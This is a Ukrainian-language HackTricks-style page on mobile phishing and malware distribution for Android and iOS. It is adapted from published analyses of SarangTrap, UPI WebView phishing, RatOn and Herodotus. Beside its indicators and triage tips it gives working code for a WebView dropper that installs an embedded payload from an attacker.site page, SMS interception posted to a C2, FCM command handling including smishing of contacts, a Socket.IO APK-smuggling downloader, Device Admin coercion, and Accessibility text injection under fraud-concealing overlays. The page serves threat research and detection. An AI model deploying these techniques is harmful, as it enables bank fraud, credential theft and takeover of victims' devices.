# Мобільний Phishing & Розповсюдження шкідливих додатків (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> На цій сторінці описано техніки, які використовують threat actors для розповсюдження **шкідливих Android APK** та **iOS mobile-configuration profiles** через phishing (SEO, social engineering, підроблені магазини, dating apps тощо).
> Матеріал адаптовано з кампанії SarangTrap, виявленої Zimperium zLabs (2025), та інших публічних досліджень.

## Потік атаки

1. **SEO/Phishing Infrastructure**
* Реєстрація десятків схожих доменів (dating, cloud share, car service…).
– Використовувати ключові слова на місцевій мові та емоджі в елементі `<title>` для ранжування в Google.
– Розміщувати інструкції з встановлення для *Android* (`.apk`) та *iOS* на одній посадковій сторінці.
2. **First Stage Download**
* Android: пряме посилання на *unsigned* або APK з «third‑party store».
* iOS: `itms-services://` або просте HTTPS‑посилання на шкідливий **mobileconfig** профіль (див. нижче).
3. **Post-install Social Engineering**
* Після першого запуску додаток просить **invitation / verification code** (ілюзія ексклюзивного доступу).
* Код відправляється методом **POST по HTTP** до Command-and-Control (C2).
* C2 відповідає `{"success":true}` ➜ malware продовжує роботу.
* Sandbox / AV динамічний аналіз, який ніколи не надсилає валідний код, не бачить **шкідливої поведінки** (evation).
4. **Runtime Permission Abuse** (Android)
* Небезпечні permissions запитуються тільки **після позитивної відповіді від C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Новіші варіанти **видаляють `<uses-permission>` для SMS з `AndroidManifest.xml`**, але лишають Java/Kotlin шлях для читання SMS через reflection ⇒ знижує статичний score, але залишається функціональним на пристроях, які дають дозвіл через AppOps або на старих цілях.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 ввів **Restricted settings** для sideloaded додатків: перемикачі Accessibility та Notification Listener сірі, поки користувач явно не дозволить restricted settings в **App info**.
* Phishing‑сторінки та droppers тепер містять покрокові UI‑інструкції, як **дозволити restricted settings** для sideloaded додатку, а потім увімкнути Accessibility/Notification доступ.
* Новіший обхід — встановлення payload через **session‑based PackageInstaller flow** (той самий метод, що використовують app stores). Android вважає додаток як встановлений з магазину, тому Restricted settings більше не блокує Accessibility.
* Підказка для триажу: у dropper‑і grep для `PackageInstaller.createSession/openSession` плюс код, який одразу переводить жертву до `ACTION_ACCESSIBILITY_SETTINGS` або `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* Додаток показує нешкідливі вьюхи (SMS viewer, gallery picker), реалізовані локально.
* Тим часом він ексфільтрує:
- IMEI / IMSI, номер телефону
- Повний дамп `ContactsContract` (JSON масив)
- JPEG/PNG з `/sdcard/DCIM`, стиснуті з використанням [Luban](https://github.com/Curzibn/Luban) для зменшення розміру
- Опційно вміст SMS (`content://sms`)
Payloads **пакуються у батч‑zip** і відправляються через `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Один **mobile-configuration profile** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо для запису пристрою в «MDM»-подібний supervision.
* Інструкції соціальної інженерії:
1. Відкрити Settings ➜ *Profile downloaded*.
2. Натиснути *Install* тричі (скріншоти на phishing‑сторінці).
3. Довіряти unsigned профілю ➜ attacker отримує entitlements для *Contacts* та *Photo* без перевірки App Store.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads можуть **прикріпити phishing URL на Home Screen** з брендовою іконкою/назвою.
* Web Clips можуть працювати **повноекранно** (ховають UI браузера) і бути позначені **non‑removable**, змушуючи жертву видаляти профіль для видалення іконки.
9. **Network Layer**
* Прості HTTP, часто на порту 80 з HOST header типу `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (відсутність TLS → легко виявити).

## Поради для Red‑Team

* **Dynamic Analysis Bypass** – під час оцінки malware автоматизуйте фазу вводу invitation code з Frida/Objection, щоб дістатися до шкідливої гілки.
* **Manifest vs. Runtime Diff** – порівняйте `aapt dump permissions` з runtime `PackageManager#getRequestedPermissions()`; відсутність небезпечних perms — червоний прапор.
* **Network Canary** – налаштуйте `iptables -p tcp --dport 80 -j NFQUEUE` для виявлення нестабільних POST‑сплесків після введення коду.
* **mobileconfig Inspection** – використовуйте `security cms -D -i profile.mobileconfig` на macOS, щоб перелічити `PayloadContent` і помітити надмірні entitlements.

## Корисний фрагмент Frida: Auto-Bypass Invitation Code

<details>
<summary>Frida: авто-обхід коду запрошення</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Індикатори (Загальні)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 шаблон

Цей шаблон спостерігався в кампаніях, що використали теми державних виплат для викрадення Indian UPI credentials та OTPs. Оператори ланцюжать авторитетні платформи для доставки та стійкості.

### Ланцюг доставки через довірені платформи
- YouTube video lure → в описі міститься коротке посилання
- Коротке посилання → GitHub Pages phishing-сайт, що імітує легітимний портал
- Той же GitHub repo хостить APK з фейковою відміткою “Google Play”, яка посилається безпосередньо на файл
- Динамічні phishing-сторінки розгорнуті на Replit; канал віддалених команд використовує Firebase Cloud Messaging (FCM)

### Dropper з вбудованим payload та офлайн-встановленням
- Перший APK — installer (dropper), який містить реальний malware у `assets/app.apk` і просить користувача вимкнути Wi‑Fi/mobile data, щоб зменшити ефективність cloud detection.
- Вбудований payload встановлюється під невинною міткою (наприклад, “Secure Update”). Після встановлення і installer, і payload присутні як окремі додатки.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Динамічне виявлення endpoint через shortlink
- Malware отримує список живих endpoints у простому тексті, розділений комами, зі shortlink; прості перетворення рядків формують фінальний шлях до phishing-сторінки.

Приклад (очищено):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Псевдокод:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Крок «Make payment of ₹1 / UPI‑Lite» завантажує HTML-форму зловмисника з динамічного endpoint всередині WebView і захоплює конфіденційні поля (телефон, банк, UPI PIN), які `POST`яться до `addup.php`.

Мінімальний loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- На першому запуску запитуються агресивні дозволи:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Контакти перебираються в циклі для масової розсилки smishing SMS з пристрою жертви.
- Вхідні SMS перехоплюються broadcast receiver і відправляються з метаданими (sender, body, SIM slot, per-device random ID) на `/addsm.php`.

Ескіз broadcast receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) як стійкий C2
- payload реєструється в FCM; push messages несуть поле `_type`, яке використовується як перемикач для запуску дій (наприклад, оновлення phishing text templates, переключення поведінки).

Приклад FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Ескіз Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Індикатори/IOCs
- APK містить вторинний payload у `assets/app.apk`
- WebView завантажує payment з `gate.htm` і exfiltrates до `/addup.php`
- SMS exfiltration to `/addsm.php`
- Отримання конфігурації через shortlink (наприклад, `rebrand.ly/*`) з поверненням CSV endpoints
- Додатки, марковані як загальні “Update/Secure Update”
- FCM `data` messages з дискримінатором `_type` в ненадійних додатках

---

## Socket.IO/WebSocket-based APK Smuggling + Фальшиві сторінки Google Play

Зловмисники все частіше замінюють статичні посилання на APK на канал Socket.IO/WebSocket, вбудований у принади, що імітують Google Play. Це приховує payload URL, обходить URL/extension filters та зберігає реалістичний install UX.

Типовий клієнтський потік, спостережений у реальних атаках:

<details>
<summary>Socket.IO фейковий Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Чому це обходить прості контролі:
- No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
- URL/MIME/extension filters that block direct .apk responses may miss binary data tunneled via WebSockets/Socket.IO.
- Crawlers and URL sandboxes that don’t execute WebSockets won’t retrieve the payload.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Кампанія RatOn banker/RAT (ThreatFabric) є конкретним прикладом того, як сучасні mobile phishing операції поєднують WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, і навіть NFC-relay orchestration. Цей розділ абстрагує повторно використовувані техніки.

### Stage-1: WebView → native install bridge (dropper)
Зловмисники відображають WebView, що вказує на сторінку атакуючого, і інжектують JavaScript interface, який експонує native installer. Торкання HTML button викликає native code, який встановлює second-stage APK, упакований в assets dropper’а, а потім одразу його запускає.

Minimal pattern:

<details>
<summary>Мінімальний патерн Stage-1 dropper (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML на сторінці:
```html
<button onclick="bridge.installApk()">Install</button>
```
Після встановлення dropper запускає payload через явний package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ідея для пошуку: ненадійні додатки, які викликають `addJavascriptInterface()` і відкривають installer-like методи для WebView; APK постачається з вбудованим secondary payload у `assets/` і викликає Package Installer Session API.

### Воронка згоди: Accessibility + Device Admin + подальші runtime prompts
Stage-2 відкриває WebView, який містить сторінку “Access”. Її кнопка викликає exported method, що переводить жертву в Accessibility settings і запитує увімкнення шкідливого сервісу. Після надання дозволу malware використовує Accessibility, щоб автоматично натискати через наступні діалоги runtime permission (contacts, overlay, manage system settings тощо) і запитує Device Admin.

- Accessibility програмно допомагає підтверджувати подальші запити, знаходячи кнопки на кшталт “Allow”/“OK” у node-tree і виконуючи кліки.
- Перевірка/запит Overlay permission:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom через WebView
Оператори можуть видавати команди для:
- відобразити повноекранний overlay з URL, або
- передати inline HTML, яке завантажується в WebView overlay.

Ймовірні сценарії використання: примус (введення PIN), відкриття wallet для перехоплення PIN, ransom messaging. Мати команду, щоб перевірити та забезпечити наявність дозволу на overlay, якщо його немає.

### Модель віддаленого керування – текстовий псевдо-екран + screen-cast
- Low-bandwidth: періодично дампити Accessibility node tree, серіалізувати видимі тексти/ролі/bounds і відправляти в C2 як псевдо-екран (команди типу `txt_screen` — одноразово і `screen_live` — постійно).
- High-fidelity: запитувати MediaProjection і запускати screen-casting/recording за запитом (команди типу `display` / `record`).

### ATS playbook (bank app automation)
За заданим JSON-завданням: відкрити bank app, керувати UI через Accessibility, комбінуючи текстові запити і натискання за координатами, та вводити платіжний PIN жертви при запиті.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Приклади текстів, які зустрічаються в одному цільовому потоці (CZ → EN):
- "Nová platba" → "Новий платіж"
- "Zadat platbu" → "Ввести платіж"
- "Nový příjemce" → "Новий одержувач"
- "Domácí číslo účtu" → "Номер внутрішнього рахунку"
- "Další" → "Далі"
- "Odeslat" → "Надіслати"
- "Ano, pokračovat" → "Так, продовжити"
- "Zaplatit" → "Сплатити"
- "Hotovo" → "Готово"

Оператори також можуть перевіряти/підвищувати ліміти переказів за допомогою команд, таких як `check_limit` та `limit`, які схожим чином працюють з UI лімітів.

### Crypto wallet seed extraction
Цілі, такі як MetaMask, Trust Wallet, Blockchain.com, Phantom. Потік: розблокувати (вкрадений PIN або наданий пароль), перейти до Security/Recovery, reveal/show seed phrase, keylog/exfiltrate її. Реалізуйте локалезовано-орієнтовані селектори (EN/RU/CZ/SK) для стабілізації навігації між мовами.

### Device Admin coercion
Device Admin APIs використовуються для збільшення можливостей перехоплення PIN і ускладнення дій жертви:

- Негайне блокування:
```java
dpm.lockNow();
```
- Спровокувати закінчення терміну дії поточних облікових даних, щоб примусити зміну (Accessibility захоплює новий PIN/пароль):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Примусове розблокування без біометрії шляхом відключення біометричних функцій keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Багато контролів DevicePolicyManager вимагають Device Owner/Profile Owner на сучасних Android; деякі OEM-збірки можуть бути менш суворими. Завжди перевіряйте на цільовій ОС/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 може встановити та запустити зовнішній модуль NFC-relay (наприклад, NFSkate) і навіть передати йому HTML-шаблон для підказки жертві під час реле. Це дозволяє безконтактний card-present cash-out поряд з онлайн ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/стан: `txt_screen`, `screen_live`, `display`, `record`
- Соціальне: `send_push`, `Facebook`, `WhatsApp`
- Накладки: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Гаманці: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Пристрій: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Комунікації/Розвідка: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Актори загрози все частіше поєднують автоматизацію на базі Accessibility з антидетекцією, налаштованою проти базової поведінкової біометрії. Нещодавній banker/RAT демонструє два комплементарні режими доставки тексту та перемикач оператора для імітації людського набору з рандомізованою каденцією.

- Режим виявлення: перебір видимих вузлів із селекторами та bounds для точного націлювання полів введення (ID, text, contentDescription, hint, bounds) перед виконанням дії.
- Подвійна інжекція тексту:
- Режим 1 – `ACTION_SET_TEXT` безпосередньо в цільовий вузол (стабільно, без клавіатури);
- Режим 2 – встановлення clipboard + `ACTION_PASTE` у сфокусований вузол (працює, коли пряме setText заблоковано).
- Людська каденція: розбити рядок, наданий оператором, і вводити його символ за символом із рандомізованими затримками 300–3000 ms між подіями, щоб уникнути евристик «machine-speed typing». Реалізується або шляхом поступового нарощування значення через `ACTION_SET_TEXT`, або вставкою по одному символу.

<details>
<summary>Ескіз Java: виявлення вузлів + затримане введення по символу через setText або clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Блокуючі оверлеї для прикриття шахрайства:
- Відображати на весь екран `TYPE_ACCESSIBILITY_OVERLAY` з непрозорістю, якою керує оператор; тримайте його непрозорим для жертви, поки під ним працює віддалена автоматизація.
- Зазвичай доступні команди: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Мінімальний оверлей з регульованою прозорістю (alpha):
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Зазвичай зустрічаються примітиви керування оператором: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (спільний доступ до екрана).

## Джерела

- [Новий Android malware Herodotus імітує людську поведінку, щоб уникнути виявлення](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [Темний бік роману: кампанія вимагання SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – бібліотека стиснення зображень для Android](https://github.com/Curzibn/Luban)
- [Android malware обіцяє субсидію на електроенергію, щоб викрасти фінансові дані (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [Зростання RatOn: від крадіжок через NFC до віддаленого керування та ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan, що націлений на користувачів Android в Індонезії та В'єтнамі (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Обхід обмежень Android 13 за допомогою SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Налаштування Web Clips payload для пристроїв Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
